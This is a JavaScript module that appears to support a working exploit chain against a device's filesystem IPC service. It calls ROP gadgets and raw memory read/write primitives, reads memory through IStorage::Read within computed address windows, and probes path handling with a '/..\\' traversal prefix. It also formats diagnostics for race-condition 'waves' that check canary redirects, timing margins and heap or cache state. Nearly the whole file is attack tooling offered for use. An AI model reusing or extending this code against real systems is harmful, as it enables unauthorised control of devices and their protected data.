import coreRuntime from "../runtime.mjs";

const {
  GADGET_MEMSET,
  allocPage,
  call_rop,
  closeHandle,
  hex32,
  ipcStorageRead,
  prepPacket,
  read32,
  read64,
  read8,
  sendIPC,
  write32,
  write8,
  writeXDesc
} = coreRuntime;

// ── Cache-mapped memory I/O ───────────────────────────────────────────────

export function readFsAddressBytes(input) {
    const config = input.config;
    let addressPlan = input.addressPlan;
    let candidateHandle = input.candidateHandle;
    let address = input.address;
    let length = input.length;
    let outputBuf = input.outputBuf;
    let allowedWindow = input.allowedWindow;
    let materializeBytes = input.materializeBytes;
    if (allowedWindow &&
        (!Number.isSafeInteger(allowedWindow.start) ||
            !Number.isSafeInteger(allowedWindow.end) ||
            allowedWindow.end <= allowedWindow.start))
        return {ok: false, error: "explicit address window is invalid"};
    var allowedStart = 0;
    if (allowedWindow) {
        allowedStart = allowedWindow.start;
    } else if (addressPlan && addressPlan.lowerWindow) {
        allowedStart = addressPlan.lowerWindow.proposedStart;
    }

    var allowedEnd = 0;
    if (allowedWindow) {
        allowedEnd = allowedWindow.end;
    } else if (addressPlan) {
        allowedEnd = addressPlan.target + config.CONTROL_SIZE;
    }

    if (!Number.isSafeInteger(address) || !Number.isInteger(length) ||
        length <= 0 || !Number.isSafeInteger(address + length) ||
        !addressPlan || !addressPlan.lowerWindow ||
        !Number.isSafeInteger(allowedStart) ||
        !Number.isSafeInteger(allowedEnd) || allowedEnd <= allowedStart ||
        address < allowedStart || address + length > allowedEnd)
        return {ok: false, error: "address is outside its explicit bounded window"};

    var copyBytes = materializeBytes !== false;
    var bytes = copyBytes ? [] : null;
    var currentAddress = address;
    var remaining = length;
    while (remaining > 0) {
        var fileOffset = currentAddress - addressPlan.addressBias;
        var bucketIndex = Math.floor(fileOffset / config.CONTROL_SIZE) *
            config.CONTROL_SIZE % config.ROOT_CAPTURE_CHUNK;
        var requestOffset;
        var prefix = 0;
        var take;
        if (bucketIndex === 0) {
            requestOffset = fileOffset;
            take = Math.min(remaining, config.ROOT_CAPTURE_CHUNK);
        } else {
            requestOffset = Math.floor(fileOffset / config.ROOT_CAPTURE_CHUNK) *
                config.ROOT_CAPTURE_CHUNK;
            prefix = fileOffset - requestOffset;
            take = Math.min(remaining, config.ROOT_CAPTURE_CHUNK - prefix);
        }
        var requestSize = prefix + take;
        if (!copyBytes && (prefix !== 0 || take !== length ||
            remaining !== length))
            return {ok: false,
                error: "buffer-only reads require one aligned cache chunk"};
        if (requestOffset < 0 || requestSize <= 0 ||
            requestOffset + requestSize > addressPlan.storageSize ||
            addressPlan.addressBias + requestOffset < allowedStart ||
            addressPlan.addressBias + requestOffset + requestSize > allowedEnd)
            return {ok: false, error: "aligned read is outside its explicit bounded window"};

        call_rop(GADGET_MEMSET, outputBuf, 0xA5n, BigInt(requestSize));
        var reply = ipcStorageRead(candidateHandle, requestOffset,
            requestSize, outputBuf);
        if (reply.error !== 0)
            return {ok: false, fatal: true,
                error: "IStorage::Read=" + hex32(reply.error) +
                    " transport=" + (reply.transport == null
                        ? "unknown" : hex32(reply.transport)) +
                    " cmif=" + (reply.cmifError == null
                        ? "none" : hex32(reply.cmifError)) +
                    " offset=0x" + requestOffset.toString(16) +
                    " size=0x" + requestSize.toString(16)};
        var nonPoison = hasByteDifferentFast(
            outputBuf + BigInt(prefix), take, 0xA5);
        if (!nonPoison)
            return {ok: false, fatal: true,
                error: "read window remained poison"};

        if (copyBytes) {
            for (var i = 0; i < take; i++)
                bytes.push(Number(read8(outputBuf + BigInt(prefix + i))));
        }
        currentAddress += take;
        remaining -= take;
    }
    return {ok: true, bytes: bytes, buffer: outputBuf, bufferOffset: 0};
}

// ── Formatting utilities ──────────────────────────────────────────────────

export function pad2(n) { return n < 10 ? "0" + n : "" + n; }
export function padRight(s, len) {
    while (s.length < len) s += " ";
    return s;
}

const WAVE_REJECTION_LABELS = {
    reservation: "reservations",
    "workers-done": "workers incomplete",
    transport: "IPC failed",
    "workers-join": "workers did not join",
    "protected": "worker flags",
    "release-sent": "release failed",
    signal: "completion signal",
    "trig-span": "trigger timing unavailable",
    "shape": "overlap pattern",
    "margin>=300": "margin below 300µs",
    "no-abort": "unexpected abort",
    tails: "path fragments",
    commit: "save commit",
    read: "storage read",
    paths: "path results",
    "pin-shape": "pin reply",
    "clear-ok": "heap clear",
    "pre-ok": "heap probe",
    "heap-restore": "heap counters",
    "pin-cost": "pin allocation",
    "pin-window": "pin timing",
    "pin-1st": "initial pin",
    "pre-release": "cache hold"
};

function waveStatus(profile, result, verdict) {
    if (profile === "abort-control")
        return result.abortControl ? "PASS · expected abort" : "REJECTED";
    if (profile === "abort-hole-control")
        return result.abortHoleControl ? "PASS · expected abort" : "REJECTED";
    if (profile === "extent-present")
        return result.extentQualified ? "PASS · marker found" : "REJECTED";
    if (profile === "negative")
        return result.negativeControl ? "PASS · expected error" : "REJECTED";
    if (profile === "positive") {
        if (result.canaryRedirect) return "QUALIFIED FLIP";
        if (result.observedCanaryRedirect && !result.window)
            return "FLIP OUTSIDE WINDOW";
        if (result.window) return "WINDOW OK · no flip";
        return "REJECTED";
    }
    if (profile === "extent-absent") return "REFERENCE";
    if (profile.indexOf("cache") === 0 ||
        /accepted|copy-ok/i.test(String(verdict || ""))) {
        return /accepted|copy-ok/i.test(String(verdict || ""))
            ? "ACCEPTED" : "REJECTED";
    }
    return verdict || (result.window ? "WINDOW OK" : "REJECTED");
}

function isCacheCopyProfile(profile, verdict) {
    return profile.indexOf("cache") === 0 ||
        /header copy/i.test(String(verdict || ""));
}

function waveRejectionSummary(result, config, profile, verdict) {
    const reasons = [];
    for (const key of result.rejections || []) {
        let label = WAVE_REJECTION_LABELS[key] || key.replace(/-/g, " ");
        if (key === "shape") label += " " + result.shape + "/" +
            config.OVERLAP_COUNT;
        if (key === "paths" && result.changedPaths?.length)
            label += ": " + result.changedPaths.join(",");
        if (!reasons.includes(label)) reasons.push(label);
    }

    if (isCacheCopyProfile(profile, verdict) && result.window) {
        if (result.preReleaseUsed == null ||
            result.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD) {
            reasons.push("cache hold below minimum");
        } else if (result.changedPaths?.length) {
            reasons.push("unexpected path result");
        }
    }

    if (result.postCanaryHealth && !result.postCanaryHealth.healthy)
        reasons.push("post-wave canary health");

    if (!reasons.length) {
        if (profile === "abort-control" || profile === "abort-hole-control")
            reasons.push("abort check did not match");
        else if (profile === "extent-present")
            reasons.push("marker result did not match");
        else if (profile === "negative")
            reasons.push("expected error was not returned");
        else if (profile === "positive")
            reasons.push(result.window
                ? "canary did not flip" : "window gates did not qualify");
        else if (result.changedPaths?.length)
            reasons.push("changed paths: " + result.changedPaths.join(","));
    }

    if (reasons.length > 2)
        return reasons.slice(0, 2).join(", ") + " +" +
            (reasons.length - 2) + " checks";
    return reasons.join(", ");
}

function formatPathReplyCode(value) {
    if (value == null) return "na";
    var raw = Number(value) >>> 0;
    if (raw === 0xFFFFFFFF) return "send-failed";
    var canonical = raw & 0x3FFFFF;
    return raw === canonical
        ? "0x" + raw.toString(16)
        : "0x" + raw.toString(16) + "/0x" + canonical.toString(16);
}

function formatRenameInputDiagnostics(diagnostics) {
    if (!diagnostics) return "path-inputs=unavailable";
    var labels = [
        ["src", "fillerSource"], ["dst", "fillerDestination"],
        ["guard0", "guardSource"], ["guard1", "guardDestination"]
    ];
    var summaries = [];
    for (var i = 0; i < labels.length; i++) {
        var label = labels[i][0];
        var name = labels[i][1];
        var before = diagnostics.before?.[name];
        var after = diagnostics.after?.[name];
        if (!before?.available || !after?.available) {
            summaries.push(label + "=unavailable");
            continue;
        }
        var beforeStatus = before.matchesExpected ? "ok" : "diff@" +
            (before.firstDiff ? before.firstDiff.offset : "?");
        var afterStatus = after.matchesExpected ? "ok" : "diff@" +
            (after.firstDiff ? after.firstDiff.offset : "?");
        var status = beforeStatus + ">" + afterStatus +
            (before.hash !== after.hash ? "/mutated" : "");
        summaries.push(label + "/" + before.size + "=0x" +
            before.hash.toString(16) + ">0x" + after.hash.toString(16) +
            "/" + status);
    }
    var descriptorStatus = diagnostics.descriptorsOk ? "ok" : "bad";
    if (!diagnostics.descriptorsOk && diagnostics.descriptors?.roles) {
        var badRoles = diagnostics.descriptors.roles.filter(role =>
            role.descriptors.some(desc => !desc.matchesExpected));
        descriptorStatus += ":" + badRoles.map(role => "W" + role.role + "[" +
            role.descriptors.map((desc, index) => index + ":" +
                desc.index + "/" + desc.size + "@0x" +
                desc.address.toString(16) + "/0x" +
                desc.word0.toString(16) + "/0x" +
                desc.word1.toString(16)).join(",") + "]").join(";");
    }
    return "path-inputs=" + summaries.join(",") + ";xdesc=" +
        descriptorStatus;
}

export function formatWaveSummaryLine(id, profile, result, verdict, input) {
    const config = input.config;
    const status = waveStatus(profile, result, verdict);
    const isCacheProfile = isCacheCopyProfile(profile, verdict);
    let line = "Wave " + pad2(id) + " [" + profile + "] " + status;

    if (profile === "extent-absent") {
        line += " · window=" + (result.window ? "OK" : "no");
        if (result.triggerCanonical != null)
            line += " · trigger=0x" +
                Number(result.triggerCanonical).toString(16);
    }

    if (["abort-control", "abort-hole-control", "extent-present",
        "negative", "extent-absent", "positive"].indexOf(profile) >= 0 &&
        result.canaryType != null) {
        line += " · canary=" + (result.canaryType === 1 ? "file" :
            result.canaryType === 0 ? "DIR" : "error");
    }

    if (profile === "abort-control" && result.pinDiagnostics?.created)
        line += " · pin=" + (result.pinFirstWaveQualified ? "OK" : "not qualified");

    if (result.margin != null)
        line += " · margin=" + result.margin + "/300µs";

    if (profile === "positive") {
        if (result.canaryRedirect) line += " · post-check=OK";
    }

    if (isCacheProfile) {
        const held = result.preReleaseUsed == null
            ? "n/a" : "0x" + Number(result.preReleaseUsed).toString(16);
        line += " · cache=" + held + "/0x" +
            Number(config.FIELD_MINIMUM_CACHE_HELD).toString(16);
    }

    if (result.pathReplyResults) {
        const paths = result.pathReplyResults;
        const parts = [];
        if (paths.filler0 != null) parts.push("f0:" + formatPathReplyCode(paths.filler0));
        if (paths.filler1 != null) parts.push("f1:" + formatPathReplyCode(paths.filler1));
        parts.push("g0:" + formatPathReplyCode(paths.guard0));
        parts.push("g1:" + formatPathReplyCode(paths.guard1));
        line += " · RenameFile=" + parts.join(",");
    }
    if (result.renameInputDiagnostics)
        line += " · " + formatRenameInputDiagnostics(
            result.renameInputDiagnostics);

    if (status === "REJECTED" || status === "FLIP OUTSIDE WINDOW") {
        const reasons = waveRejectionSummary(result, config, profile, verdict);
        if (reasons) line += " · cause: " + reasons;
    }
    if (result.postCanaryHealth && !result.postCanaryHealth.healthy)
        line += " · post-check failed";
    return line;
}

export function readHexBytes(addr, count) {
    var hex = "";
    for (var i = 0; i < count; i++)
        hex += ("0" + Number(read8(addr + BigInt(i))).toString(16)).slice(-2);
    return hex;
}

export function bytesToHex(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i++)
        out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
}

export function ipcGetEntryTypeRawBytes(handle, bytes) {
    var pathBuf = allocPage(0x1000);
    for (var i = 0; i < bytes.length; i++)
        write8(pathBuf + BigInt(i), BigInt(bytes[i]));
    var inputMatches = true;
    for (var i = 0; i < bytes.length; i++) {
        if (Number(read8(pathBuf + BigInt(i))) !== bytes[i]) {
            inputMatches = false;
            break;
        }
    }

    var pkt = allocPage(0x2000);
    prepPacket(pkt, (4 | (1 << 16)) >>> 0, 8, []);
    writeXDesc(pkt, 8, pathBuf, bytes.length);
    write32(pkt + 0x10n, 0x49434653n);
    write32(pkt + 0x18n, 7n);
    var transport = Number(sendIPC(handle, pkt)) >>> 0;
    var type = Number(read32(pkt)) & 0xFFFF;
    var magic = Number(read32(pkt + 0x10n)) >>> 0;
    if (transport !== 0 || type !== 0 || magic !== 0x4F434653) {
        return {ok: false, transport: transport, type: type, magic: magic,
            result: 0xFFFFFFFF, canonical: 0xFFFFFFFF,
            inputMatches: inputMatches};
    }
    var result = Number(read32(pkt + 0x18n)) >>> 0;
    return {ok: true, transport: transport, type: type, magic: magic,
        result: result, canonical: result & 0x3FFFFF,
        inputMatches: inputMatches};
}

// ── Address and encoding helpers ──────────────────────────────────────────

export function checkAddressHeaderEncoding(headerBytes, input) {
    let savedHandle = input.savedHandle;
    var prefix = [0x2F, 0x2E, 0x2E, 0x5C]; // "/..\\"
    var invalidBytes = prefix.concat([0xFF, 0]);
    var encodedBytes = prefix.concat(headerBytes, [0]);
    var invalid = ipcGetEntryTypeRawBytes(savedHandle, invalidBytes);
    var encoded = ipcGetEntryTypeRawBytes(savedHandle, encodedBytes);
    return {
        invalid: invalid,
        encoded: encoded,
        ok: invalid.ok && encoded.ok && invalid.inputMatches &&
            encoded.inputMatches && invalid.canonical === 0x2EEA02 &&
            encoded.canonical === 0x2EEC02
    };
}

export function buffersEqual(a, b, length) {
    for (var i = 0; i < length; i++)
        if (Number(read8(a + BigInt(i))) !==
            Number(read8(b + BigInt(i)))) return false;
    return true;
}

export function buffersEqualFast(a, b, length) {
    // Whole-word comparison is safe when both addresses have the same
    // alignment. Retain the general bytewise path for unequal alignments.
    if ((a & 7n) !== (b & 7n)) return buffersEqual(a, b, length);

    var alignment = Number(a & 7n);
    var prefix = alignment === 0 ? 0 : 8 - alignment;
    var offset = 0;
    var prefixEnd = Math.min(prefix, length);
    for (; offset < prefixEnd; offset++) {
        if (Number(read8(a + BigInt(offset))) !==
            Number(read8(b + BigInt(offset)))) return false;
    }
    for (; offset + 8 <= length; offset += 8) {
        if (read64(a + BigInt(offset)) !==
            read64(b + BigInt(offset))) return false;
    }
    for (; offset < length; offset++) {
        if (Number(read8(a + BigInt(offset))) !==
            Number(read8(b + BigInt(offset)))) return false;
    }
    return true;
}

export function hasByteDifferent(addr, length, value) {
    for (var i = 0; i < length; i++)
        if (Number(read8(addr + BigInt(i))) !== value) return true;
    return false;
}

export function hasByteDifferentFast(addr, length, value) {
    var repeatedWord = BigInt(value) * 0x0101010101010101n;
    var offset = 0;
    var alignment = Number(addr & 7n);
    var prefix = alignment === 0 ? 0 : 8 - alignment;
    var prefixEnd = Math.min(prefix, length);
    for (; offset < prefixEnd; offset++)
        if (Number(read8(addr + BigInt(offset))) !== value) return true;
    for (; offset + 8 <= length; offset += 8) {
        if (read64(addr + BigInt(offset)) !== repeatedWord) return true;
    }
    for (; offset < length; offset++)
        if (Number(read8(addr + BigInt(offset))) !== value) return true;
    return false;
}

export function scanPointerWords(addr, length, limit) {
    var found = [];
    for (var off = 0; off + 8 <= length && found.length < limit; off += 8) {
        var value = read64(addr + BigInt(off));
        if (value >= 0x100000000n && value < 0x8000000000n &&
            value % 8n === 0n)
            found.push("+0x" + off.toString(16) + "=0x" +
                value.toString(16));
    }
    return found.join(" ") || "none";
}

export function cleanup(input) {
    let auxiliaryStorageHandle = input.auxiliaryStorageHandle;
    let candidateHandle = input.candidateHandle;
    let domainSession = input.domainSession;
    let extentTriggerHandle = input.extentTriggerHandle;
    let pinHandle = input.pinHandle;
    let rootClones = input.rootClones || [];
    let rootSession = input.rootSession;
    let saveClones = input.saveClones || [];
    let savedHandle = input.savedHandle;
    let storageHandle = input.storageHandle;
    let temporaryHandle = input.temporaryHandle;
    let preserveTemporaryHandleForCleanup =
        input.preserveTemporaryHandleForCleanup === true;
    let triggerHandle = input.triggerHandle;
    if (candidateHandle) closeHandle(candidateHandle);
    if (pinHandle) closeHandle(pinHandle);
    if (extentTriggerHandle) closeHandle(extentTriggerHandle);
    if (triggerHandle) closeHandle(triggerHandle);
    if (storageHandle) closeHandle(storageHandle);
    if (auxiliaryStorageHandle) closeHandle(auxiliaryStorageHandle);
    for (var i = 0; i < rootClones.length; i++) closeHandle(rootClones[i]);
    for (var i = 0; i < saveClones.length; i++) closeHandle(saveClones[i]);
    if (savedHandle) closeHandle(savedHandle);
    if (temporaryHandle && !preserveTemporaryHandleForCleanup)
        closeHandle(temporaryHandle);
    if (domainSession) {
        closeHandle(domainSession.handle);
        domainSession = null;
    }
    if (rootSession) closeHandle(rootSession);
    return {closed: true};
}
